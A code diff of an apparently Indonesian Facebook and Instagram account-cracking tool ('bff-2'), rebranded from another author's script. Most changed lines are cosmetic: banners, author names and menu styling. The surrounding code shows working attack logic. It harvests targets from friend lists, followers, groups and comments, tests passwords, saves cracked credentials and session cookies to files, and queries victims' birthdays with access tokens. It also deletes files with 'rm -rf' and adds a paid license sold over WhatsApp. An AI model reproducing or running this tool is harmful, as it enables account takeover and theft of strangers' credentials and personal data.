@@ -67,7 +67,7 @@ def ingfoh():
 f"""{Hj}
  • Info script :
  	
- - author      : Romi Afrizal
+ - author      : DENYXD
  - instagram   : romz_xyz
  - facebook    : facebook.com/romi.afrizal.102
  - fanspage    : facebook.com/100022086172556
@@ -158,11 +158,10 @@ N = '\x1b[0m' # WARNA MATI
 acak = [M, H, K, B, U, O, P, J]
 warna = random.choice(acak)
 til ="•"
-cek = '-->'
 
 ok, cp, id, user, pwx, loop = [], [], [], [], [], 0
 
-sys.stdout.write('\x1b[1;35m\x1b]2; {×} Crack by Ncek {×} \x07')
+sys.stdout.write('\x1b[1;35m\x1b]2; {×} bff-2 by romz {×} \x07')
 
 # JALAN
 def jalan(keliling):
@@ -190,17 +189,17 @@ except KeyError:
 	IP = " "
 	CN = " "
 
-author = 'NCEK-XD'
-fb_me = 'facebook.com/ncek-XD'
-github = 'github.com/Ncek-XD'
+author = 'Romi Afrizal'
+fb_me = 'facebook.com/romi.afrizal.102'
+github = 'github.com/Mark-Zuck'
 
 def banner():
 	os.system('clear')
 	logo = (f'# • Author : {author} •')
-	play = rich.markdown.Markdown(logo, style='red')
+	play = rich.markdown.Markdown(logo, style='green')
 	rich.console.Console().print(play)
-	print (' %s%s%s%s%s                                      %s%s%s%s%s%s\n%s   _______  ______ _______ _______ _     _\n   |       |_____/ |_____| |       |____/ \n%s   |_____  |    \\_ |     | |_____  |    \\_\n\n %s%s%s%s%s%s                                      %s%s%s%s%s%s \n %s# %sFb  %s : %s%s \n %s# %sGit%s  : %s%s \n %s# %s---------------------------------------- %s#  '%
-	(til,M,til,H,til,M,til,K,til,H,til,M,P,M,til,K,til,H,til,M,til,K,til,H,til,U,O,M,O,fb_me,U,O,M,O,github,P,M,P))
+	print (' %s%s%s%s%s%s                                      %s%s%s%s%s%s\n%s   _______  ______ _______ _______ _     _\n   |       |_____/ |_____| |       |____/ \n%s   |_____  |    \\_ |     | |_____  |    \\_\n\n %s%s%s%s%s%s                                      %s%s%s%s%s%s \n %s# %sFb  %s : %s%s \n %s# %sGit%s  : %s%s \n %s# %s---------------------------------------- %s#  '%
+	(M,til,K,til,H,til,M,til,K,til,H,til,M,P,M,til,K,til,H,til,M,til,K,til,H,til,U,O,M,O,fb_me,U,O,M,O,github,P,M,P))
 	print (' %s#%s IP   %s:%s %s %s- %s%s '%(U,O,M,O,IP,H,O,CN))
     
 # CONVERT COOKIE DICT TO STRING
@@ -214,14 +213,14 @@ def romz_xyz(cookie,venom={}):
 # MENU MASUK
 def Masuk():
 	try:
-		   cek = open("cookies").read()
+		kueh = romz_xyz(open("data/cookies","r").read().strip())
 	except FileNotFoundError:
 		os.system('clear')
 		banner()
-		print ('\n%s[01] %sLogin instagram (crack akun instagram) '%(U,B))
-		print ('%s[02] %sLogin via cookie (crack akun facebook) '%(U,B))
-		print ('%s[03] %sCara mendapatkan cookie facebook '%(U,B))
-		print ('%s[00] %sKeluar '%(M,M))
+		print ('\n%s%s%s 01 %sLogin instagram (crack akun instagram) '%(U,til,K,O))
+		print ('%s%s%s 02 %sLogin via cookie (crack akun facebook) '%(U,til,K,O))
+		print ('%s%s%s 03 %sCara mendapatkan cookie facebook '%(U,til,K,O))
+		print ('%s%s%s 00 %sKeluar '%(U,til,M,O))
 		while True:
 			rom = input ("\n%s# %sPilih %s> %s"%(P,O,M,K))
 			if rom in(""):
@@ -347,15 +346,15 @@ class Menu():
 		try:
 			kueh = romz_xyz(open("data/cookies","r").read().strip())
 		except IOError:
-			os.system("  data/cookies && rm -rf data/token && rm -rf data/my_info")
+			os.system("rm -rf data/cookies && rm -rf data/token && rm -rf data/my_info")
 			print ("%s%s cookie invalid "%(M,til));jeda(2)
-			os.system('python cracks-dec.py')
+			os.system('python bff-2.py')
 		try:
 			tentang = json.loads(open("data/my_info","r").read().strip())
 		except FileNotFoundError:
 			from data import informasi
 			informasi.info(kueh, requests.get("https://mbasic.facebook.com/profile.php?v=info",cookies = kueh).text).myinfo()
-			os.system('python cracks-dec.py')
+			os.system('python bff-2.py')
 		try:
 			a = requests.get(f"{self.url}/profile.php", cookies = kueh).text
 		except requests.exceptions.ConnectionError:
@@ -363,25 +362,25 @@ class Menu():
 		if "mbasic_logout_button" not in a:
 			os.system("rm -rf data/cookies && rm -rf data/token && rm -rf data/my_info")
 			print ("%s%s cookie invalid "%(M,til));jeda(2)
-			os.system('python cracks-dec.py')
+			os.system('python bff-2.py')
 		else:
 			banner()
 			print(f"{U} # {O}Name{M} : {H}{tentang.get('nama')}\n")
-			print ('%s[01] %sCrack dari daftar teman '%(U,B))
-			print ('%s[02] %sCrack dari total pengikut'%(U,B))
-			print ('%s[03] %sCrack dari reaction post'%(U,B))
-			print ('%s[04] %sCrack dari komentar post'%(U,B))
-			print ('%s[05] %sCrack dari anggota group'%(U,B))
-			print ('%s[06] %sCrack dari pencarian nama'%(U,B))
-			print ('%s[07] %sCrack dari pesan mesengger'%(U,B))
-			print ('%s[08] %sCrack dari saran teman'%(U,B))
-			print ('%s[09] %sCrack user instagram %spro'%(U,B,H))
+			print ('%s•%s 01 %sCrack dari daftar teman '%(U,P,O))
+			print ('%s•%s 02 %sCrack dari total pengikut'%(U,P,O))
+			print ('%s•%s 03 %sCrack dari reaction post'%(U,P,O))
+			print ('%s•%s 04 %sCrack dari komentar post'%(U,P,O))
+			print ('%s•%s 05 %sCrack dari anggota group'%(U,P,O))
+			print ('%s•%s 06 %sCrack dari pencarian nama'%(U,P,O))
+			print ('%s•%s 07 %sCrack dari pesan mesengger'%(U,P,O))
+			print ('%s•%s 08 %sCrack dari saran teman'%(U,P,O))
+			print ('%s•%s 09 %sCrack user instagram %spro'%(U,P,O,H))
 			#print ('%s•%s 10 %sSetting user agent'%(U,P,O))
-			print ('%s[10] %sLihat hasil crack'%(U,B))
-			print ('%s[11] %sCheckpoint detektor'%(U,B))
-			print ('%s[12] %sInfo (tentang)'%(U,B))
-			print ('%s[rm] %sHapus data login'%(U,B))
-			print ('%s[00] %sKeluar (logout)'%(U,M))
+			print ('%s•%s 10 %sLihat hasil crack'%(U,P,O))
+			print ('%s•%s 11 %sCheckpoint detektor'%(U,P,O))
+			print ('%s•%s 12 %sInfo (tentang)'%(U,P,O))
+			print ('%s•%s rm %sHapus data login'%(U,P,O))
+			print ('%s•%s 00 %sKeluar (logout)'%(U,M,O))
 		
 class pilihan:
 	
@@ -1058,7 +1057,7 @@ class Crack:
 						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
 						day, month, year = lahir.split('/')
 						month = bulan12[month]
-						print ('\r %s--> %s ◊ %s ◊ %s %s %s ◊ %s '%(H,user,pw,day,month,year,kukis))
+						print ('\r %s*--> %s ◊ %s ◊ %s %s %s ◊ %s '%(H,user,pw,day,month,year,kukis))
 						os.popen("play-audio dapet.mp3")
 						ok.append("%s ◊ %s ◊ %s %s %s ◊ %s "%(user,pw,day,month,year,kukis))
 						open('OK/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s ◊ %s %s %s ◊ %s \n"%(user,pw,day,month,year,kukis))
@@ -1070,7 +1069,7 @@ class Crack:
 						year = ''
 					except:
 						pass
-					print ('\r %s[OK] %s ◊ %s ◊ %s '%(H,user,pw,kukis))
+					print ('\r %s*--> %s ◊ %s ◊ %s '%(H,user,pw,kukis))
 					os.popen("play-audio dapet.mp3")
 					ok.append('%s ◊ %s ◊ %s'%(user,pw,kukis))
 					open('OK/%s.txt'%(waktu), 'a').write(' *--> %s ◊ %s ◊ %s\n'%(user,pw,kukis))
@@ -1093,7 +1092,7 @@ class Crack:
 						year = ''
 					except:
 						pass
-					print ('\r %s[CP] %s ◊ %s           '%(K,user,pw))
+					print ('\r %s*--> %s ◊ %s           '%(K,user,pw))
 					os.popen("play-audio dapet.mp3")
 					cp.append('%s ◊ %s'%(user,pw))
 					open('CP/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s\n"%(user,pw))
@@ -1129,7 +1128,7 @@ class Crack:
 						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
 						day, month, year = lahir.split('/')
 						month = bulan12[month]
-						print ('\r %s--> %s ◊ %s ◊ %s %s %s ◊ %s '%(H,user,pw,day,month,year,kukis))
+						print ('\r %s*--> %s ◊ %s ◊ %s %s %s ◊ %s '%(H,user,pw,day,month,year,kukis))
 						os.popen("play-audio dapet.mp3")
 						ok.append("%s ◊ %s ◊ %s %s %s ◊ %s "%(user,pw,day,month,year,kukis))
 						open('OK/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s ◊ %s %s %s ◊ %s \n"%(user,pw,day,month,year,kukis))
@@ -1141,7 +1140,7 @@ class Crack:
 						year = ''
 					except:
 						pass
-					print ('\r %s[OK] %s ◊ %s ◊ %s '%(H,user,pw,kukis))
+					print ('\r %s*--> %s ◊ %s ◊ %s '%(H,user,pw,kukis))
 					os.popen("play-audio dapet.mp3")
 					ok.append('%s ◊ %s ◊ %s'%(user,pw,kukis))
 					open('OK/%s.txt'%(waktu), 'a').write(' *--> %s ◊ %s ◊ %s\n'%(user,pw,kukis))
@@ -1164,7 +1163,7 @@ class Crack:
 						year = ''
 					except:
 						pass
-					print ('\r %s[CP] %s ◊ %s           '%(K,user,pw))
+					print ('\r %s*--> %s ◊ %s           '%(K,user,pw))
 					os.popen("play-audio dapet.mp3")
 					cp.append('%s ◊ %s'%(user,pw))
 					open('CP/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s\n"%(user,pw))
@@ -1200,7 +1199,7 @@ class Crack:
 						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
 						day, month, year = lahir.split('/')
 						month = bulan12[month]
-						print ('\r %s--> %s ◊ %s ◊ %s %s %s ◊ %s '%(H,user,pw,day,month,year,kukis))
+						print ('\r %s*--> %s ◊ %s ◊ %s %s %s ◊ %s '%(H,user,pw,day,month,year,kukis))
 						os.popen("play-audio dapet.mp3")
 						ok.append("%s ◊ %s ◊ %s %s %s ◊ %s "%(user,pw,day,month,year,kukis))
 						open('OK/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s ◊ %s %s %s ◊ %s \n"%(user,pw,day,month,year,kukis))
@@ -1212,7 +1211,7 @@ class Crack:
 						year = ''
 					except:
 						pass
-					print ('\r %s[OK] %s ◊ %s ◊ %s '%(H,user,pw,kukis))
+					print ('\r %s*--> %s ◊ %s ◊ %s '%(H,user,pw,kukis))
 					os.popen("play-audio dapet.mp3")
 					ok.append('%s ◊ %s ◊ %s'%(user,pw,kukis))
 					open('OK/%s.txt'%(waktu), 'a').write(' *--> %s ◊ %s ◊ %s\n'%(user,pw,kukis))
@@ -1235,7 +1234,7 @@ class Crack:
 						year = ''
 					except:
 						pass
-					print ('\r %s[CP] %s ◊ %s           '%(K,user,pw))
+					print ('\r %s*--> %s ◊ %s           '%(K,user,pw))
 					os.popen("play-audio dapet.mp3")
 					cp.append('%s ◊ %s'%(user,pw))
 					open('CP/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s\n"%(user,pw))
@@ -1314,7 +1313,7 @@ def cek_apk(kukis):
 	game = [i.text for i in x.find_all("h3")]
 	try:
 		for i in range(len(game)):
-			print ("\r      %s%s. %s%s"%(P,i+[1],cek,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
+			print ("\r      %s%s. %s%s"%(P,i+1,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
 	except AttributeError:
 		print ("\r      %s• cookie invalid"%(M))
 	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kukis}).text
@@ -1323,7 +1322,7 @@ def cek_apk(kukis):
 	game = [i.text for i in x.find_all("h3")]
 	try:
 		for i in range(len(game)):
-			print ("\r      %s%s. %s%s"%(P,i+[1],cek,M,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
+			print ("\r      %s%s. %s%s"%(P,i+1,M,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
 	except AttributeError:
 		print ("\r      %s• cookie invalid"%(M))
 
@@ -2286,6 +2285,47 @@ def brute(email_dev, san_dev_):
 		except KeyboardInterrupt:
 			exit("%s• Keluar...."%(M))
 		except:
+			pass
+			
+# LISENSI
+def get_license(integer):
+    lis = list("ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789")
+    gets = [random.choice(lis) for _ in range(integer)]
+    return "".join(gets).upper()
+
+class key:
+	
+	def __init__(self):
+		self=[]
+	
+	def konfirmasi(self):
+		os.system("clear")
+		banner()
+		print('\n')
+		print ('\x1b[1;95m•\x1b[1;96m Mohon tunggu ...');jeda(1)
+		digit = random.choice([20])
+		id = get_license(digit)
+		lpg = open('data/lisensi.txt', 'w')
+		lpg.write(id)
+		lpg.close()
+		print ("\n\n%s•%s Daftar list harga %s:"%(U,O,M));jeda(0.07)
+		print ("  %s-%s 20k 1 minggu"%(P,O));jeda(0.07)
+		print ("  %s-%s 60k 1 bulan"%(P,O));jeda(0.07)
+		jalan ('\n%s• %sLisensi%s : %s%s'%(U,O,M,H,id));jeda(1)
+		jalan ('%s• %sLisensi Belum Di konfirmasi'%(U,O))
+		suh=input("\n%s•%s ingin beli lisensi? y/t %s: %s"%(U,O,M,K))
+		if suh in['']:
+			exit()
+		elif suh in["y","Y"]:
+			jalan ("\n%s•%s menuju ke whatsap untuk membeli lisensi "%(U,O))
+			jalan ("%s•%s no whatsap saya %s: %s+6282371648186 "%(U,O,M,H))
+			os.system('am start https://wa.me/+6282371648186?text=Assalamualaikum+saya+ingin+beli+lisensi:+'+id+'>/dev/null');jeda(1)
+			exit()
+		elif suh in["t","T"]:
+			exit()
+		elif suh in["python2 bff-2.py"]:
+			menu()
+		else:
 			exit()
 
 if __name__=="__main__":
